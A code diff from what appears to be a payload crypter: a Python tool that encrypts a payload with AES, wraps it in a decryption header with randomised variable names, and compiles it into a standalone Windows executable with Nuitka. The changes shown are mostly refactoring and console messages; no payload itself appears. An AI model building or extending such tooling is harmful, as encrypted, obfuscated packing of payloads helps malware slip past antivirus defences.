@@ -27,6 +27,7 @@ def encrypt_payload(payload_path: str, save_path: str) -> bool | None:
     Generates a random key, creates random variable names for the decryption header
     program and encrypts the payload with AES in CBC mode
     """
+    CONSOLE.print("Starting encryption...")
     payload = get_file(payload_path)
 
     if payload is None:
@@ -70,22 +71,21 @@ def compile_encrypted_payload(payload_path: str):
     """
     Compiles the payload into a windows executeable
     """
-    success = True
-    with subprocess.Popen(
-        ["python3", "-m", "nuitka", payload_path, "--standalone", "--onefile"],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
+    CONSOLE.print("Starting compilation...")
+    process = subprocess.run(
+        [
+            "python3",
+            "-m",
+            "nuitka",
+            payload_path,
+            "--standalone",
+            "--onefile",
+        ],
+        capture_output=True,
         text=True,
-    ) as proc:
-        for line in proc.stdout:
-            CONSOLE.print(line, end='')
+    )
 
-        stdout, stderr = proc.communicate()
-
-        if "No module named nuitka" in stderr:
-            success = False
-            
-    if not success:
+    if "No module named nuitka" in process.stderr:
         subprocess.run(
             [
                 "python",
@@ -94,7 +94,9 @@ def compile_encrypted_payload(payload_path: str):
                 payload_path,
                 "--standalone",
                 "--onefile",
-            ]
+            ],
+            capture_output=True,
+            text=True,
         )
 
     CONSOLE.print("Removing build folders and encrypted payload...")
@@ -103,9 +105,10 @@ def compile_encrypted_payload(payload_path: str):
     shutil.rmtree(payload_path[:-3] + ".onefile-build")
     shutil.rmtree(payload_path[:-3] + ".dist")
 
-    SUCCESS_CONSOLE.print(f"Successfully compiled payload to {payload_path[:-3] + '.exe'}!")
+    SUCCESS_CONSOLE.print(
+        f'Successfully compiled payload to "{payload_path[:-3] + ".exe"}"!'
+    )
 
 
 if __name__ == "__main__":
     app()
-    # main("test_payload.py", "test_enc.py", True)
